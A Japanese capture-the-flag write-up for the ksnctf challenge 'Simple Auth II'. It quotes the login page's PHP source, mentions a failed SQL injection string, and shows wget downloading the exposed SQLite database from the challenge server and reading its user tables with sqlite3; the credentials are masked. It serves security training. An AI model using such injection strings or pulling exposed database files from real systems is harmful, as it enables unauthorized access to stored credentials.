# 問題
simple vulnerability  
http://ctfq.sweetduet.info:10080/~q35/auth.php  
source



# 問題について
簡単な認証を突破してフラグをゲットしましょう！！  
....？本当にそうでしょうか...よく考えてみてください。  

確かに、IDとパスワード認証できるのでSQLインジェクションで抜ける気もしますが...



# 解法

1. まず、 ' or ' ' = ' ;' -- をやればできるだろう。と思ったあなたはここで挫折するかもしれません。


1. とてもシンプルです。添付されているソースを読んでみましょう。
    ```php
    if ($_POST['id']!=='' or $_POST['password']!=='')
    {
        $try = true;
        $db = new PDO('sqlite:database.db');
        $s = $db->prepare('SELECT * FROM user WHERE id=? AND password=?');
        $s->execute(array($_POST['id'], $_POST['password']));
        $ok = $s->fetch() !== false;
    }
    ```
   ...データベースの場所モロバレですね。




3. wgetで回収してみましょう

    ### ダウンロード
    ```
    nyancat86@ubuntu:~/git/ksnctf/35_SimpleAuthII/work$ wget http://ctfq.sweetduet.info:10080/~q35/database.db
    --2018-07-20 15:04:42--  http://ctfq.sweetduet.info:10080/~q35/database.db
    ctfq.sweetduet.info (ctfq.sweetduet.info) をDNSに問いあわせています... 49.212.153.157, 2403:3a00:202:1210:49:212:153:157
    ctfq.sweetduet.info (ctfq.sweetduet.info)|49.212.153.157|:10080 に接続しています... 接続しました。
    HTTP による接続要求を送信しました、応答を待っています... 200 OK
    長さ: 2048 (2.0K) [text/plain]
    `database.db' に保存中

    database.db              100%[==================================>]   2.00K  --.-KB/s    時間 0s    

    2018-07-20 15:04:42 (72.1 MB/s) - `database.db' へ保存完了 [2048/2048]
    ```
    ### ファイルがあるか確認

    ```
    nyancat86@ubuntu:~/git/ksnctf/35_SimpleAuthII/work$ ls
    database.db  source
    ```


1. ファイルを解析しましょう

   ### fileコマンドでデータベースファイルの情報を確認

    ```
    nyancat86@ubuntu:~/git/ksnctf/35_SimpleAuthII/work$ file database.db 
    database.db: SQLite 3.x database, last written using SQLite version 3008006
    ```

    SQLite3のデータベースであることがわかりました。


   ### sqlite3を使って見てみましょう

    ```sql
    nyancat86@ubuntu:~/git/ksnctf/35_SimpleAuthII/work$ sqlite3 database.db 
    SQLite version 3.22.0 2018-01-22 18:45:57
    Enter ".help" for usage hints.

    ### テーブル一覧を表示させる ###
    sqlite> .table
    user   user2

    ### userのなかみを見る ###

    sqlite> select * from user;
    root|**********************

    ### user2の中身を見る ###
    sqlite> select * from user2;
    root|**********************
    ```

    フラグを手に入れよう！


